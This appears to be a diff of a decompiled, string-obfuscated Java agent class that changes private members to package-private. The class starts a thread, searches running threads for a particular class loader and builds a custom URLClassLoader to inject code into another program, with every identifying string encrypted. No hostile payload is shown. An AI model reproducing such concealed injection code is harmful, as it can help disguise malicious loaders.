@@ -10,10 +10,10 @@ import java.net.URLClassLoader;
 import java.time.LocalTime;
 
 public final class dsh {
-   private static volatile boolean dsi = false;
-   private static volatile String dsj = null;
+   static volatile boolean dsi = false;
+   static volatile String dsj = null;
 
-   private dsh() {
+   dsh() {
    }
 
    public static void premain(String var0, Instrumentation var1) {
@@ -28,13 +28,13 @@ public final class dsh {
       dsm(var0);
    }
 
-   private static void dsm(String var0) {
+   static void dsm(String var0) {
       Thread var1 = new Thread(() -> dsn(var0), a.c(524070978, "뀑즊䍚\udd33嚡퀏樰\ue3e7綺\uf700烉諡љ鷅ព酼⬴ꓢ㹗렕ㇳ"));
       var1.setDaemon(true);
       var1.start();
    }
 
-   private static synchronized void dsn(String var0) {
+   static synchronized void dsn(String var0) {
       if (!dsi) {
          dsj = new File(new File(var0).getAbsoluteFile().getParent(), a.d("莸糖烓\ueeba攨\ue3f4妙큮丳쒉䍀륫㟾까␗", 391933290, -887492933)).getPath();
          dss(a.d("괞풢幱쀛䯋쵽眨ﻊ悄\uea65淥鞓ᥑ胳દ谏㙌맗⍯ꔭⲕ", 804981490, 613001115) + var0);
@@ -70,7 +70,7 @@ public final class dsh {
       }
    }
 
-   private static URLClassLoader dso(URL var0, ClassLoader var1) {
+   static URLClassLoader dso(URL var0, ClassLoader var1) {
       return new URLClassLoader(new URL[]{var0}, var1) {
          @Override
          protected Class<?> loadClass(String var1, boolean var2) throws ClassNotFoundException {
@@ -98,7 +98,7 @@ public final class dsh {
       };
    }
 
-   private static ClassLoader dsp(long var0) throws InterruptedException {
+   static ClassLoader dsp(long var0) throws InterruptedException {
       long var2 = System.currentTimeMillis() + var0;
 
       ClassLoader var4;
@@ -109,7 +109,7 @@ public final class dsh {
       return var4;
    }
 
-   private static ClassLoader dsq() {
+   static ClassLoader dsq() {
       for (Thread var1 : Thread.getAllStackTraces().keySet()) {
          for (ClassLoader var2 = var1.getContextClassLoader(); var2 != null; var2 = var2.getParent()) {
             if (var2.getClass().getName().toLowerCase().contains(a.d("໙睭ﶿ揕", -1341219301, -63336275))) {
@@ -121,7 +121,7 @@ public final class dsh {
       return null;
    }
 
-   private static String dsr() {
+   static String dsr() {
       try {
          return new File(dsh.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
       } catch (Throwable var1) {
@@ -129,7 +129,7 @@ public final class dsh {
       }
    }
 
-   private static void dss(String var0) {
+   static void dss(String var0) {
       String var1 = a.b("ꄮ", 1587061108) + LocalTime.now() + a.d("ബ瓠", 2117880671, -1439676884) + var0;
       System.out.println("" + var0);
       if (dsj != null) {
@@ -140,7 +140,7 @@ public final class dsh {
       }
    }
 
-   private static void dst(Throwable var0) {
+   static void dst(Throwable var0) {
       if (dsj == null) {
          var0.printStackTrace();
       } else {
